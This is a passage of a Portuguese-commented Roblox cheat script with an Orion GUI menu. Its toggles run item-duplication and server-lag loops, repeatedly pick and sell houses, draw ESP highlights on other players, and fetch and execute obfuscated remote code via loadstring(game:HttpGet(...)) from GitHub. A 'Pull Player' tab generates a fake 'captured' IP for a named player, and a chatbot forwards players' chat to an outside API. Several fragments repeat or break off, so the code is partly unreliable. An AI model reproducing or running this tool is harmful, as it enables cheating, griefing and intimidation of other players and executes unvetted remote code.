            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = itemPath.CFrame
            clickNormally(itemPath)
            teleportCount = teleportCount + 1
            wait(0.01) -- Tempo de espera para evitar travamento
        end
    else
        warn("Item não encontrado.")
    end
end

Tab:AddToggle({
	Name = "Lag basketball",
	Default = false,
	Callback = function(state)
		toggles.DupeBasketball = state
        if state then
            local basketballPath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_GiveTools"):FindFirstChild("Basketball")
            spawn(function()
                dupeItem(basketballPath, 9999999999999999999999999999999999999)
            end)
        else
            print("Dupe Basketball desligado.")
        end
	end    
})

local toggles = {
    DupeExtintor = false
}

local function clickNormally(object)
    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        fireclickdetector(clickDetector) -- Clica normalmente
    end
end

local function dupeItem(itemPath, maxTeleports)
    if itemPath then
        local teleportCount = 0
        while teleportCount < maxTeleports and toggles.DupeExtintor do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = itemPath.CFrame
            clickNormally(itemPath)
            teleportCount = teleportCount + 1
            wait(0.01) -- Tempo de espera para evitar travamento
        end
    else
        warn("Item não encontrado.")
    end
end


Tab:AddToggle({
	Name = "Lag extinto",
	Default = false,
	Callback = function(state)
		toggles.DupeExtintor = state
        if state then
            local fireXPath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_GiveTools"):FindFirstChild("FireX")
            spawn(function()
                dupeItem(fireXPath, 999999999999999999999999999999999999999)
            end)
        else
            print("Dupe Extintor desligado.")
        end
	end    
})


local toggles = {
    DupeBook = false
}

local function clickNormally(object)
    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        fireclickdetector(clickDetector) -- Clica normalmente
    end
end

local function dupeItem(itemPath, maxTeleports)
    if itemPath then
        local teleportCount = 0
        while teleportCount < maxTeleports and toggles.DupeBook do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = itemPath.CFrame
            clickNormally(itemPath)
            teleportCount = teleportCount + 1
            wait(0.01) -- Tempo de espera para evitar travamento
        end
    else
        warn("Item não encontrado.")
    end
end

Tab:AddToggle({
	Name = "Lag Book",
	Default = false,
	Callback = function(state)
		toggles.DupeBook = state
        if state then
            local bookPath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_DayCare"):FindFirstChild("Tools"):FindFirstChild("Book")
            spawn(function()
                dupeItem(bookPath, 99999999999999999999999999999999999)
            end)
        else
            print("Dupe Book desligado.")
        end
	end    
})


local toggles = {
    DupeStretcher = false
}

local function clickNormally(object)
    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        fireclickdetector(clickDetector) -- Clica normalmente
    end
end

local function dupeItem(itemPath, maxTeleports)
    if itemPath then
        local teleportCount = 0
        while teleportCount < maxTeleports and toggles.DupeStretcher do
            if game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = itemPath.CFrame
                clickNormally(itemPath)
                teleportCount = teleportCount + 1
                wait(0.01) -- Tempo de espera para evitar travamento
            else
                warn("Personagem do jogador não encontrado.")
                break
            end
        end
    else
        warn("ItemPath inválido.")
    end
end

local function dupeStretcher()
    local stretcherPath = workspace:FindFirstChild("WorkspaceCom")
        and workspace.WorkspaceCom:FindFirstChild("001_GiveTools")
        and workspace.WorkspaceCom["001_GiveTools"]:FindFirstChild("Stretcher")
    
    if stretcherPath then
        dupeItem(stretcherPath, 9999999999999999999999999999999999999999999999999999999999) -- Duplicar 300 vezes
    else
        warn("Item Stretcher não encontrado.")
    end
end


Tab:AddToggle({
	Name = "Lag Stretcher",
	Default = false,
	Callback = function(state)
		toggles.DupeStretcher = state
        if state then
            spawn(function()
                while toggles.DupeStretcher do
                    dupeStretcher()
                    wait(0.1) -- Espera entre duplicações
                end
            end)
        else
            print("Dupe Stretcher desligado.")
        end
	end    
})


local Tab = Window:MakeTab({
    Name = "Outros/Trolar",
    Icon = "rbxassetid://139018070578455",
    PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "Blackhole V2"
})

Tab:AddToggle({
    Name = "Blackhole V2",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Quando a toggle estiver ativada
            loadstring(game:HttpGet("https://github.com/TemplariosScripts1/Blackhole1/raw/refs/heads/main/Blackhole1Obfuscate.txt"))()
        else
            -- Quando a toggle estiver desativada
            loadstring(game:HttpGet("https://github.com/TemplariosScripts1/Blackhole2/raw/refs/heads/main/Blackhole2Obfuscate.txt"))()
        end
    end
})

local Section = Tab:AddSection({
	Name = "Anti Void"
})

-- Variável de controle
local voidImmunityEnabled = false

-- Função para ativar/desativar a imunidade ao void
local function setVoidImmunity(state)
    if state then
        workspace.FallenPartsDestroyHeight = 0/0
    else
        workspace.FallenPartsDestroyHeight = -500 -- Valor padrão do Roblox
    end
end

-- Toggle para o Orion Lib
Tab:AddToggle({
    Name = "Anti Void",
    Default = false,
    Callback = function(State)
        voidImmunityEnabled = State
        setVoidImmunity(voidImmunityEnabled)
    end
})

local Section = Tab:AddSection({
	Name = "Tornado"
})

Tab:AddToggle({
    Name = "Tornado",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Quando a toggle estiver ativada
            loadstring(game:HttpGet("https://github.com/TemplariosScripts1/Tornado/raw/refs/heads/main/TornadoObfuscate.txt"))()
        else
            -- Quando a toggle estiver desativada
            loadstring(game:HttpGet("https://github.com/TemplariosScripts1/Blackhole2/raw/refs/heads/main/Blackhole2Obfuscate.txt"))()
        end
    end
})

local Section = Tab:AddSection({
	Name = "Não Sentar em Carros/Items/Etc"
})

-- Tabela para armazenar o estado original dos assentos
local originalSeatStates = {}
-- Tabela para armazenar as conexões dos eventos
local connections = {}

-- Função que desabilita a habilidade de sentar
local function disableSeating()
    for _, seat in pairs(workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            originalSeatStates[seat] = seat.Disabled
            seat.Disabled = true
        end
    end

    table.insert(connections, workspace.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
            originalSeatStates[descendant] = descendant.Disabled
            descendant.Disabled = true
        end
    end))

    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
        table.insert(connections, player.CharacterAdded:Connect(function(character)
            table.insert(connections, character.DescendantAdded:Connect(function(descendant)
                if descendant:IsA("SeatWeld") then
                    descendant:Destroy()
                end
            end))
        end))
    end
end

-- Função que reativa a habilidade de sentar
local function enableSeating()
    for seat, originalState in pairs(originalSeatStates) do
        if seat and seat.Parent then
            seat.Disabled = originalState
        end
    end

    -- Desconecta todos os eventos
    for _, connection in pairs(connections) do
        connection:Disconnect()
    end
    connections = {}

    -- Certifica-se de que todos os assentos estejam habilitados
    for _, seat in pairs(workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            seat.Disabled = false
        end
    end

    -- Remove qualquer conexão de assento existente
    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
        if player.Character then
            for _, descendant in pairs(player.Character:GetDescendants()) do
                if descendant:IsA("SeatWeld") then
                    descendant:Destroy()
                end
            end
        end
    end
end

Tab:AddToggle({
    Name = "Não Sentar em Carros/Items/Etc",
    Default = false,
    Callback = function(value)
        if value then
            disableSeating()
        else
            enableSeating()
        end
    end
})

local Section = Tab:AddSection({
	Name = "Anti Fling"
})

-- Função para deletar o veículo específico de um jogador
local function deleteVehicleFromPlayer(player)
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if vehiclesFolder then
        local vehicleName = player.Name .. "Car"
        local vehicle = vehiclesFolder:FindFirstChild(vehicleName)
        if vehicle then
            vehicle:Destroy()
            print("Veículo deletado para: " .. player.Name)
        else
            warn("Veículo não encontrado para: " .. player.Name)
        end
    end
end

-- Função para deletar o veículo de todos os jogadores
local function deleteVehicleFromAllPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        deleteVehicleFromPlayer(player)
    end
end

-- Função para deletar as parts associadas ao jogador
local function deletePartsFromPlayer(player)
    local admFolder = workspace:FindFirstChild(player.Name)
    if admFolder then
        -- Lista das parts a serem deletadas
        local partsToDelete = {"Couch", "Stretcher", "Wagon", "Stroller", "ShoppingCart", "LawnMower"}
        
        for _, partName in pairs(partsToDelete) do
            local part = admFolder:FindFirstChild(partName)
            if part then
                part:Destroy()
                print(partName .. " deletada para: " .. player.Name)
            else
                warn(partName .. " não encontrada para: " .. player.Name)
            end
        end
    end
end

-- Função para deletar as parts de todos os jogadores
local function deletePartsFromAllPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        deletePartsFromPlayer(player)
    end
end

-- Variável de controle do loop
local isLooping = false

-- Função para controlar o loop
local function startLoop()
    while isLooping do
        deleteVehicleFromAllPlayers()       -- Deletar veículos de todos os jogadores
        deletePartsFromAllPlayers()         -- Deletar as parts de todos os jogadores
        wait(1) -- Tempo entre cada execução do loop (5 segundos neste exemplo)
    end
end

Tab:AddToggle({
    Name = "Anti Fling",
    Default = false,
    Callback = function(state)
        isLooping = state
        if isLooping then
            startLoop()
        end
    end    
})

local Section = Tab:AddSection({
	Name = "Chat Bot IA"
})

-- Variáveis
local jogadoresEspecificos = {} -- Lista de jogadores a serem monitorados
local monitorar = false -- Monitoramento de jogadores específicos
local monitorarDistancia = false -- Monitoramento por distância
local limiteCaracteres = 200
local distanciaMaxima = 0
local usarDelayPersonalizado = false
local delayPersonalizado = 8
local iaOcupada = false -- Controla se a IA está ocupada

-- Função para dividir texto
local function dividirTexto(texto, limite)
    local partes = {}
    while #texto > limite do
        table.insert(partes, string.sub(texto, 1, limite))
        texto = string.sub(texto, limite + 1)
    end
    table.insert(partes, texto)
    return partes
end

-- Função para consultar API
local function consultarAPI(mensagem)
    local url = "https://hercai.onrender.com/v3/hercai?question=" .. mensagem
    local sucesso, resposta = pcall(function()
        return game:HttpGet(url)
    end)
    if sucesso then
        local dados = game:GetService("HttpService"):JSONDecode(resposta)
        return dados["reply"] or "Erro ao obter resposta"
    else
        return "Erro para Responder. Tente novamente."
    end
end

-- Verifica se o jogador está na lista pelo nome parcial
local function jogadorNaLista(nomeJogador)
    for _, nomeParcial in ipairs(jogadoresEspecificos) do
        if nomeJogador:lower():sub(1, #nomeParcial) == nomeParcial then
            return true
        end
    end
    return false
end

-- Monitoramento do Chat
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")

TextChatService.OnIncomingMessage = function(message)
    local sender = Players:FindFirstChild(message.TextSource.Name)

    -- Verifica se o remetente é válido e não é o próprio jogador
    if not sender or sender == LocalPlayer or not sender.Character then
        return
    end

    -- Obter HumanoidRootPart dos jogadores
    local senderHRP = sender.Character:FindFirstChild("HumanoidRootPart")
    local localHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not senderHRP or not localHRP then
        return
    end

    -- Cálculo da distância
    local distancia = 0
    pcall(function()
        distancia = (localHRP.Position - senderHRP.Position).Magnitude
    end)

    -- Jogadores específicos
    if monitorar and jogadorNaLista(sender.Name) then
        if iaOcupada then
            TextChatService.TextChannels.RBXGeneral:SendAsync(sender.Name .. " aguarde! A IA já está respondendo algo.")
            return
        end

        iaOcupada = true
        local mensagemRecebida = message.Text
        local respostaAPI = consultarAPI(mensagemRecebida)
        local partes = dividirTexto(respostaAPI, limiteCaracteres)

        for i, parte in ipairs(partes) do
            local delayTime = (i == 1) and 0 or (usarDelayPersonalizado and delayPersonalizado or 8) * (i - 1)
            task.delay(delayTime, function()
                if TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
                    TextChatService.TextChannels.RBXGeneral:SendAsync(parte)
                end
                if i == #partes then
                    iaOcupada = false -- Libera a IA após responder
                end
            end)
        end
    -- Resposta por distância
    elseif monitorarDistancia and distanciaMaxima > 0 and distancia <= distanciaMaxima then
        if iaOcupada then
            return
        end

        iaOcupada = true
        local mensagemRecebida = message.Text
        local respostaAPI = consultarAPI(mensagemRecebida)
        local partes = dividirTexto(respostaAPI, limiteCaracteres)

        for i, parte in ipairs(partes) do
            local delayTime = (i == 1) and 0 or (usarDelayPersonalizado and delayPersonalizado or 8) * (i - 1)
            task.delay(delayTime, function()
                if TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
                    TextChatService.TextChannels.RBXGeneral:SendAsync(parte)
                end
                if i == #partes then
                    iaOcupada = false -- Libera a IA após responder
                end
            end)
        end
    end
end

local Section = Tab:AddSection({
	Name = "Responder determinados jogadores"
})

-- Gerenciar lista de jogadores específicos
Tab:AddTextbox({
    Name = "Jogadores que a IA vai responder.",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        table.insert(jogadoresEspecificos, value:lower())
        OrionLib:MakeNotification({
            Name = "Adicionado",
            Content = "O Jogador com nome '" .. value .. "' foi adicionado à lista de monitoramento!",
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
})

Tab:AddButton({
    Name = "Limpar Lista de Jogadores",
    Callback = function()
        jogadoresEspecificos = {}
        OrionLib:MakeNotification({
            Name = "Limpo",
            Content = "Lista de jogadores foi limpa!",
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
})

Tab:AddToggle({
    Name = "Ativar IA (Vai responder apenas jogadores digitados na textbox)",
    Default = false,
    Callback = function(state)
        monitorar = state
        if not state then
            iaOcupada = false
        end
    end
})

local Section = Tab:AddSection({
	Name = "IA por distância"
})

Tab:AddTextbox({
    Name = "Responder por distância (Digite a distância)",
    Default = "10",
    TextDisappear = true,
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            distanciaMaxima = num
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "Insira um número que seja válido",
                Image = "rbxassetid://132225387260946",
                Time = 5
            })
        end
    end
})

Tab:AddToggle({
    Name = "Ativar IA (Por Distância)",
    Default = false,
    Callback = function(state)
        monitorarDistancia = state
        if not state then
            iaOcupada = false
        end
    end
})

local Section = Tab:AddSection({
	Name = "Parar de Responder"
})

Tab:AddButton({
    Name = "Parar de Responder",
    Callback = function()
        monitorar = false
        monitorarDistancia = false
        iaOcupada = false
        jogadoresEspecificos = {}
        OrionLib:MakeNotification({
            Name = "Parado",
            Content = "Agora a IA não está respondendo ninguém",
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
})

local Section = Tab:AddSection({
	Name = "Anti Lag Server"
})

local Players = game:GetService("Players")

local PlayerName = ""

Tab:AddTextbox({
    Name = "Nome do Jogador que está lagando",
    Default = "",
    TextDisappear = false,
    Callback = function(value)
        PlayerName = value
    end
})

Tab:AddButton({
    Name = "Ativar Anti Lag Server",
    Callback = function()
        if PlayerName and PlayerName ~= "" then
            for _, player in ipairs(Players:GetPlayers()) do
                if string.find(player.Name:lower(), PlayerName:lower()) then
                    local character = workspace:FindFirstChild(player.Name)
                    if character then
                        character:Destroy()
                    end
                    local playerInstance = Players:FindFirstChild(player.Name)
                    if playerInstance then
                        playerInstance:Destroy()
                    end
                end
            end
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "Jogador não encontrado",
                Image = "rbxassetid://132225387260946",
                Time = 5
            })
        end
    end
})

local Section = Tab:AddSection({
	Name = "Notificar Saída e Entrada dos Jogadores"
})

local notifyPlayers = false

Tab:AddToggle({
    Name = "Ativar Notificações de Saída e Entrada dos Jogadores",
    Default = false,
    Callback = function(Value)
        notifyPlayers = Value
    end
})

game.Players.PlayerAdded:Connect(function(player)
    if notifyPlayers then
        local message = string.format("%s(%s) entrou no servidor!", player.Name, player.DisplayName)
        OrionLib:MakeNotification({
            Name = "Entrada de Jogador",
            Content = message,
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if notifyPlayers then
        local message = string.format("%s(%s) saiu do servidor!", player.Name, player.DisplayName)
        OrionLib:MakeNotification({
            Name = "Saída de Jogador",
            Content = message,
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
end)

local Section = Tab:AddSection({
	Name = "Bebe que Segue Jogador"
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local followToggle = false
local originalCFrame

-- Função para suavizar a movimentação até o jogador alvo
local function smoothFollow(targetHumanoidRootPart)
    local bodyPosition = Instance.new("BodyPosition")
    bodyPosition.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    bodyPosition.P = 1e5
    bodyPosition.D = 1e3
    bodyPosition.Position = targetHumanoidRootPart.Position + Vector3.new(1, 0, 0) -- Gruda na lateral direita
    bodyPosition.Parent = LocalPlayer.Character.HumanoidRootPart

    task.wait(0.5) -- Aguarda até o personagem se alinhar

    -- Após o alinhamento, cria o Weld
    local weld = Instance.new("Weld")
    weld.Part0 = LocalPlayer.Character.HumanoidRootPart
    weld.Part1 = targetHumanoidRootPart
    weld.C0 = CFrame.new(0.1, 0, 0) -- Ajusta a posição para grudar na lateral direita
    weld.Parent = LocalPlayer.Character.HumanoidRootPart

    bodyPosition:Destroy()
end

-- Função para conectar ao jogador e executar comandos
local function connectToPlayer(playerName)
    for _, player in pairs(Players:GetPlayers()) do
        if string.find(player.Name:lower(), playerName:lower()) and player ~= LocalPlayer then
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                -- Salvar posição e orientação originais
                originalCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame

                -- Suavizar movimentação até o alvo
                smoothFollow(character.HumanoidRootPart)

                -- Executar funções adicionais ao ativar
                local args1 = { "CharacterFollowSpawnPlayer", "BabyBoy" }
                ReplicatedStorage.RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args1))

                local args2 = { "CharacterSizeDown", 4 }
                ReplicatedStorage.RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args2))

                return true
            end
        end
    end
    return false
end

-- Função para desconectar e voltar ao normal
local function disconnect()
    if originalCFrame then
        -- Remover conexões (Welds) e voltar ao normal
        for _, weld in pairs(LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
            if weld:IsA("Weld") then
                weld:Destroy()
            end
        end

        -- Voltar à posição original
        LocalPlayer.Character.HumanoidRootPart.CFrame = originalCFrame

        -- Executar funções adicionais ao desativar
        local args1 = { "DeleteFollowCharacter" }
        ReplicatedStorage.RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args1))

        local args2 = { "CharacterSizeUp", 1 }
        ReplicatedStorage.RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args2))

        originalCFrame = nil
    end
end

local playerName = ""

Tab:AddTextbox({
    Name = "Digite o Nome do Jogador",
    Default = "",
    TextDisappear = true,
    Callback = function(input)
        playerName = input
    end
})

Tab:AddToggle({
    Name = "Ativar",
    Default = false,
    Callback = function(value)
        followToggle = value

        if followToggle then
            if playerName ~= "" and connectToPlayer(playerName) then
                -- Sucesso ao seguir o jogador
            else
                followToggle = false
                -- Falha ao encontrar o jogador
            end
        else
            disconnect()
            -- Jogador desconectado
        end
    end
})


local Tab = Window:MakeTab({
	Name = "Pull Player",
	Icon = "rbxassetid://10734920149",
	PremiumOnly = false
})


-- Variáveis para armazenar dados
local fakeIP = ""
local playerName = ""

-- Gerador de Fake IP
local function generateFakeIP()
    fakeIP = playerName .. "'s IP: " .. math.random(0, 255) .. "." .. math.random(0, 255) .. "." .. math.random(0, 255) .. "." .. math.random(0, 255)
    OrionLib:MakeNotification({
        Name = "IP Capturado",
        Content = fakeIP,
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

-- Caixa de Texto para Inserir o Nome do Jogador
Tab:AddTextbox({
    Name = "Nome do Jogador",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        if #Value <= 20 then
            playerName = Value
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "O nome não pode ter mais de 20 caracteres!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

-- Botão para Gerar IP
Tab:AddButton({
    Name = "Gerar Ip",
    Callback = function()
        if playerName ~= "" then
            generateFakeIP()
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "Por favor, insira um nome de jogador.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

-- Botão para Copiar o IP
Tab:AddButton({
    Name = "Copiar IP",
    Callback = function()
        if fakeIP ~= "" then
            setclipboard(fakeIP) -- Copia para a área de transferência
            OrionLib:MakeNotification({
                Name = "Copiado",
                Content = "O IP foi copiado para a área de transferência.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "Nenhum IP foi gerado ainda.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})


local selectedPlayer = nil

local function getPlayerId(player)
    return player.UserId
end

local function getJoinDate(player)
    return player.AccountAge
end

local function copyName(player)
    setclipboard(player.Name)
end

local function createESP(player)
    local esp = Instance.new("Highlight")
    esp.Parent = player.Character
    esp.Adornee = player.Character
    esp.FillColor = Color3.new(1, 0, 0)
    esp.FillTransparency = 0.5
    esp.OutlineColor = Color3.new(1, 1, 1)
    esp.OutlineTransparency = 0
end

local function updateDropdown()
    local players = game:GetService("Players"):GetPlayers()
    local playerNames = {}
    for _, player in ipairs(players) do
        table.insert(playerNames, player.Name)
    end
    return playerNames
end

Tab:AddDropdown({
    Name = "Players",
    Default = "",
    Options = updateDropdown(),
    Callback = function(value)
        selectedPlayer = game:GetService("Players"):FindFirstChild(value)
    end
})

Tab:AddButton({
    Name = "Player id",
    Callback = function()
        if selectedPlayer then
            OrionLib:MakeNotification({
                Name = "Player ID",
                Content = "ID: " .. getPlayerId(selectedPlayer),
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

Tab:AddButton({
    Name = "JoinDate (see when the player entered the game)",
    Callback = function()
        if selectedPlayer then
            OrionLib:MakeNotification({
                Name = "Join Date",
                Content = "Account Age: " .. getJoinDate(selectedPlayer) .. " days",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

Tab:AddButton({
    Name = "Copyname",
    Callback = function()
        if selectedPlayer then
            copyName(selectedPlayer)
            OrionLib:MakeNotification({
                Name = "Copy Name",
                Content = "Name copied to clipboard",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})


local Tab = Window:MakeTab({
	Name = "Break Home",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


local Section = Tab:AddSection({
    Name = "Select and Manage House"
})

-- Variável para armazenar o estado do loop
local toggles = { HouseLoop = false }

-- Variável para armazenar a casa selecionada
local selectedHouse = nil

-- Dropdown para selecionar a casa
Tab:AddDropdown({
    Name = "Target House",
    Options = {
        "Casa 7", "Casa 8", "Casa 9", "Casa 10", "Casa 11",
        "Casa 12", "Casa 13", "Casa 14", "Casa 15", "Casa 16",
        "Casa 17"
    },
    Callback = function(selectedOption)
        selectedHouse = tonumber(selectedOption:match("Casa (%d+)"))
        if selectedHouse then
            print("Casa selecionada: " .. selectedOption)
        else
            print("Erro ao selecionar a casa.")
        end
    end
})

-- Botão para iniciar o loop baseado na casa selecionada
Tab:AddButton({
    Name = "Start Selling and Picking House",
    Callback = function()
        if not selectedHouse then
            print("Por favor, selecione uma casa primeiro.")
            return
        end

        toggles.HouseLoop = true
        print("Loop iniciado para a Casa: " .. selectedHouse)

        spawn(function()
            while toggles.HouseLoop and task.wait(0.1) do
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                ReplicatedStorage.RE["1Gettin1gHous1e"]:FireServer("PickingCustomHouse", "015_House", selectedHouse)
                ReplicatedStorage.RE["1Player1sHous1eChoic1e"]:FireServer("PlayerSellHouse")
            end
        end)
    end
})

-- Botão para parar o loop
Tab:AddButton({
    Name = "Stop Selling and Picking House",
    Callback = function()
        if toggles.HouseLoop then
            toggles.HouseLoop = false
            print("Loop parado.")
        else
            print("Nenhum loop está ativo.")
        end
    end
})


local Tab = Window:MakeTab({
	Name = "Visual",
	Icon = "rbxassetid://101885100425607",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "ESP"
})

local espEnabled = false -- Variável para rastrear o estado do ESP
local playerConnections = {} -- Tabela para rastrear conexões dos jogadores

-- Função para criar o ESP
local function createESP(player)
    if player == game.Players.LocalPlayer then return end -- Ignorar o jogador local

    local function setupESP(character)
        if not character:FindFirstChild("Head") then
            character:WaitForChild("Head") -- Garante que a cabeça exista
        end
        if not character:FindFirstChildOfClass("Humanoid") then
            character:WaitForChild("Humanoid") -- Garante que o humanoide exista
        end

        -- Criando o Highlight
        local highlight = Instance.new("Highlight")
        highlight.Name = "ESP_Highlight"
        highlight.FillColor = Color3.new(1, 1, 1) -- Branco
        highlight.FillTransparency = 0.5 -- Transparência no contorno
        highlight.OutlineTransparency = 0 -- Contorno sólido
        highlight.Parent = character

        -- Tornando o jogador branco transparente
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") and part.Transparency < 1 then
                part:SetAttribute("OriginalTransparency", part.Transparency) -- Salva a transparência original
                part.Transparency = 0.5 -- Define transparência para 50%
                part.Color = Color3.new(1, 1, 1) -- Deixa a cor branca
            end
        end

        -- Criando o BillboardGui
        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Name = "ESP_Info"
        billboardGui.Size = UDim2.new(0, 150, 0, 30)
        billboardGui.StudsOffset = Vector3.new(0, 3, 0)
        billboardGui.Adornee = character:FindFirstChild("Head")
        billboardGui.AlwaysOnTop = true
        billboardGui.Parent = character

        -- Criando o Texto
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.TextColor3 = Color3.new(1, 1, 1)
        textLabel.TextStrokeTransparency = 1 -- Remover o contorno preto
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.SourceSans -- Fonte alterada para SourceSans
        textLabel.Parent = billboardGui

        -- Atualizar as informações imediatamente
        local function updateInfo()
            if character and character:FindFirstChild("Humanoid") and character.PrimaryPart then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                local distance = math.floor((character.PrimaryPart.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude)
                textLabel.Text = string.format("%s | Vida: %d | Distância: %d", player.Name, math.floor(humanoid.Health), distance)
            end
        end

        -- Atualizar as informações em loop
        task.spawn(function()
            while espEnabled and character and character:FindFirstChild("Humanoid") do
                updateInfo()
                task.wait(1)
            end
        end)

        -- Atualizar imediatamente ao criar
        updateInfo()
    end

    if player.Character then
        setupESP(player.Character)
    end

    player.CharacterAdded:Connect(function(character)
        if espEnabled then
            setupESP(character)
        end
    end)
end

-- Função para remover o ESP de um jogador
local function removeESP(player)
    if player.Character then
        -- Remover Highlight
        if player.Character:FindFirstChild("ESP_Highlight") then
            player.Character.ESP_Highlight:Destroy()
        end
        -- Remover BillboardGui
        if player.Character:FindFirstChild("ESP_Info") then
            player.Character.ESP_Info:Destroy()
        end
        -- Restaurar transparência original
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") and part:GetAttribute("OriginalTransparency") then
                part.Transparency = part:GetAttribute("OriginalTransparency") -- Restaurar transparência
                part:SetAttribute("OriginalTransparency", nil) -- Remover atributo
            end
        end
    end
end

-- Função para ativar o ESP
local function enableESP()
    espEnabled = true
    for _, player in pairs(game.Players:GetPlayers()) do
        -- Criar ESP imediatamente quando o jogador já está no jogo
        if player.Character then
            createESP(player)
        end
        -- Conexão para futuros personagens do jogador
        playerConnections[player] = player.CharacterAdded:Connect(function(character)
            if espEnabled then
                createESP(player)
            end
        end)
    end

    -- Conexão para novos jogadores
    playerConnections["PlayerAdded"] = game.Players.PlayerAdded:Connect(function(player)
        if espEnabled then
            -- Criar ESP imediatamente para novos jogadores
            if player.Character then
                createESP(player)
            end
            -- Conectar ao evento CharacterAdded
            playerConnections[player] = player.CharacterAdded:Connect(function(character)
                createESP(player)
            end)
        end
    end)
end

-- Função para desativar o ESP
local function disableESP()
    espEnabled = false
    for _, player in pairs(game.Players:GetPlayers()) do
        removeESP(player)
        -- Desconectar eventos associados ao jogador
        if playerConnections[player] then
            playerConnections[player]:Disconnect()
            playerConnections[player] = nil
        end
    end

    -- Desconectar o evento de novos jogadores
    if playerConnections["PlayerAdded"] then
        playerConnections["PlayerAdded"]:Disconnect()
        playerConnections["PlayerAdded"] = nil
    end
end

-- Toggle para ativar/desativar o ESP
Tab:AddToggle({
    Name = "ESP",
    Default = false,
    Callback = function(state)
        if state then
            enableESP()
        else
            disableESP()
        end
    end
})
print("button pressed")
  	end    
})


local Tab = Window:MakeTab({
	Name = "Créditos",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddParagraph("Update Log 📄","<font color='rgb(66, 3, 255)'>Bugs De travamento Corrigido,melhor desempenho, funções Novas.</font>")

local Section = Tab:AddSection({
	Name = "Créditos"
})

Tab:AddParagraph("Créditos 📃","Créditos: <font color='rgb(66, 3, 255)'>Noly, sr_greg81, ADMbrookhaven</font>")
